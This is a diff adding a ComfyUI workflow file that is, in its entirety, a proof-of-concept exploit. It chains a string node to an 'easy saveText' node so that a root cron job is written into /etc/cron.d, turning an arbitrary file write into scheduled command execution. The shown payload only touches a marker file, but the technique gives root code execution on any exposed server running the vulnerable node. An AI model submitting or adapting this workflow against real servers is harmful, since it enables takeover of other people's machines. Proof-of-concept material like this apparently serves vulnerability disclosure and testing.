@@ -1,0 +1,21 @@
+{
+  "1": {
+    "class_type": "easy string",
+    "inputs": {
+      "value": "* * * * * root touch /tmp/cron_rce_proof\n"
+    }
+  },
+  "2": {
+    "class_type": "easy saveText",
+    "inputs": {
+      "text": [
+        "1",
+        0
+      ],
+      "output_file_path": "/etc/cron.d",
+      "file_name": "comfyui_rce",
+      "file_extension": "txt",
+      "overwrite": true
+    }
+  }
+}
